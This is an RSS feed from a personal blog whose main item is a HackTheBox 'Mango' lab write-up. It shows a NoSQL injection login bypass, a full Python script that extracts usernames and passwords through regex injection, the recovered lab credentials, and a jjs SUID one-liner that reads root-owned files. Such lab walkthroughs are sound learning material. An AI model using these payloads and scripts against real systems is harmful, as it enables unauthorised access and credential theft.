<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on ajdintrejic</title>
        <link>https://ajdintrejic.github.io/posts/</link>
        <description>Recent content in Posts on ajdintrejic</description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Fri, 01 May 2020 13:28:11 +0200</lastBuildDate>
        <atom:link href="https://ajdintrejic.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>HackTheBox :: Mango Write Up</title>
            <link>https://ajdintrejic.github.io/posts/2020/05/hackthebox-mango-write-up/</link>
            <pubDate>Fri, 01 May 2020 13:28:11 +0200</pubDate>
            
            <guid>https://ajdintrejic.github.io/posts/2020/05/hackthebox-mango-write-up/</guid>
            <description>This is a write-up of HackTheBox Mango. Contact me on Twitter (@ajdintrejic) if you have any questions
Reconnaissance Let’s run nmap,
sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there.</description>
            <content type="html"><![CDATA[<p><img src="/htb-mango/mango_info_card.png" alt="infocard"></p>
<p>This is a write-up of HackTheBox Mango.
Contact me on Twitter (@ajdintrejic) if you have any questions</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>Let’s run nmap,</p>
<pre><code>sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
</code></pre><p><img src="/htb-mango/nmap_initial_results.png" alt="nmap"></p>
<p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
<p><img src="/htb-mango/mango_search_page.png" alt="page"></p>
<p><img src="/htb-mango/mango_analytics_page.png" alt="page"></p>
<h2 id="getting-user-account">Getting user account</h2>
<p>I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference:
staging-order.mango.htb</p>
<p><img src="/htb-mango/ssl_certificate.png" alt="ssl"></p>
<p>The page is inaccessible, but we can use the /etc/hosts file to redirect the page back to the server itself. You could also change the headers of the https request and change the host value to “staging-order.mango.htb”.</p>
<p>We have multiple server running on the same machine and port (Vhost - virtual hosts) so that is why when we change the host value, we access a “different” server.</p>
<p>Now I added the line to /etc/hosts so the hostname is translated to the correct IP address.</p>
<p><img src="/htb-mango/etc_hosts.png" alt="hosts"></p>
<h3 id="nosql-injection">NoSQL injection</h3>
<p>Now we have a login page here, I spent around 4 hours here as this wasn’t something I had experience with. We have to perform an authentication bypass.</p>
<p><img src="/htb-mango/login_mongodb.png" alt="login"></p>
<p>The login is handeld by MongoDB in the background. How do I know this? The full nmap scan has recognized a MongoDB instance. MondoDB is a NoSQL database, unlike PostgreSQL, which is an SQL database. We need to perform a NoSQL injection attack.</p>
<p>I opened the network tab in Firefox and tried to login with “admin” and “test”. This will send a POST request. We can open it and see the request body.</p>
<p><img src="/htb-mango/network_tab.png" alt="network"></p>
<p><img src="/htb-mango/request.png" alt="request"></p>
<p>Edit the request:</p>
<p>Before:</p>
<pre><code>username=admin&amp;password=test&amp;login=login
</code></pre><p>After:</p>
<pre><code>username=admin&amp;password[$ne]=test&amp;login=login
</code></pre><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
<p><img src="/htb-mango/request_reply.png" alt="reply"></p>
<p><img src="/htb-mango/after_login.png" alt="afterlogin"></p>
<h3 id="bruteforcing-the-password">Bruteforcing the password</h3>
<p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
<p>You should change the cookie ID.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">import</span> requests
<span style="color:#fff;font-weight:bold">import</span> stringurl = <span style="color:#0ff;font-weight:bold">&#34;http://example.com&#34;</span>
headers = {<span style="color:#0ff;font-weight:bold">&#34;Host&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;exmaple.com&#34;</span>}
cookies = {<span style="color:#0ff;font-weight:bold">&#34;PHPSESSID&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
possible_chars = <span style="color:#fff;font-weight:bold">list</span>(string.ascii_letters) + <span style="color:#fff;font-weight:bold">list</span>(string.digits) + [<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>+c <span style="color:#fff;font-weight:bold">for</span> c in string.punctuation+string.whitespace ]<span style="color:#fff;font-weight:bold">def</span> get_password(username):
    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Extracting password of &#34;</span>+username)
    params = {<span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>:username, <span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>}
    password = <span style="color:#0ff;font-weight:bold">&#34;^&#34;</span>
    <span style="color:#fff;font-weight:bold">while</span> True:
        <span style="color:#fff;font-weight:bold">for</span> c in possible_chars:
            params[<span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>] = password + c + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(pr.status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
                password += c
                <span style="color:#fff;font-weight:bold">break</span>
        <span style="color:#fff;font-weight:bold">if</span> c == possible_chars[-<span style="color:#ff0;font-weight:bold">1</span>]:
            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found password &#34;</span>+password[<span style="color:#ff0;font-weight:bold">1</span>:].replace(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>)+<span style="color:#0ff;font-weight:bold">&#34; for username &#34;</span>+username)
            <span style="color:#fff;font-weight:bold">return</span> password[<span style="color:#ff0;font-weight:bold">1</span>:].replace(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>)<span style="color:#fff;font-weight:bold">def</span> get_usernames():
    usernames = []
    params = {<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>}
    <span style="color:#fff;font-weight:bold">for</span> c in possible_chars:
        username = <span style="color:#0ff;font-weight:bold">&#34;^&#34;</span> + c
        params[<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>] = username + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(pr.status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found username starting with &#34;</span>+c)
            <span style="color:#fff;font-weight:bold">while</span> True:
                <span style="color:#fff;font-weight:bold">for</span> c2 in possible_chars:
                    params[<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>] = username + c2 + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
                    <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
                        username += c2
                        <span style="color:#fff;font-weight:bold">print</span>(username)
                        breakif c2 == possible_chars[-<span style="color:#ff0;font-weight:bold">1</span>]:
                    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found username: &#34;</span>+username[<span style="color:#ff0;font-weight:bold">1</span>:])
                    usernames.append(username[<span style="color:#ff0;font-weight:bold">1</span>:])
                    <span style="color:#fff;font-weight:bold">break</span>
    <span style="color:#fff;font-weight:bold">return</span> usernamesfor u in get_usernames():
    get_password(u)
</code></pre></div><p>This will run for some time, the output is:</p>
<p><img src="/htb-mango/password_bruteforce.png" alt="success"></p>
<pre><code>admin:t9KcS3&gt;!0B#2
mango:h3mXK8RhU~f{]f5H
</code></pre><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
<p><img src="/htb-mango/user_txt.png" alt="usertxt"></p>
<h2 id="getting-root-account">Getting root account</h2>
<p>First, I switch from sh to bash by running /bin/bash.</p>
<p>I transfered linenum.sh on the server and checked the output. There was an interesting file with SUID bit set to 1:</p>
<p><img src="/htb-mango/jjs.png" alt="jjs"></p>
<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS</h3>
<p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
<pre><code>echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); var FileReader = Java.type(&quot;java.io.FileReader&quot;); var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); while ((line = br.readLine()) != null) { print(line); }' | jjs
</code></pre><p><img src="/htb-mango/root_txt.png" alt="roottxt"></p>
<p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>
]]></content>
        </item>
        
        <item>
            <title>My First Post</title>
            <link>https://ajdintrejic.github.io/posts/2020/05/my-first-post/</link>
            <pubDate>Fri, 01 May 2020 12:05:40 +0200</pubDate>
            
            <guid>https://ajdintrejic.github.io/posts/2020/05/my-first-post/</guid>
            <description>Hello World</description>
            <content type="html"><![CDATA[<p>Hello World</p>
]]></content>
        </item>
        
    </channel>
</rss>
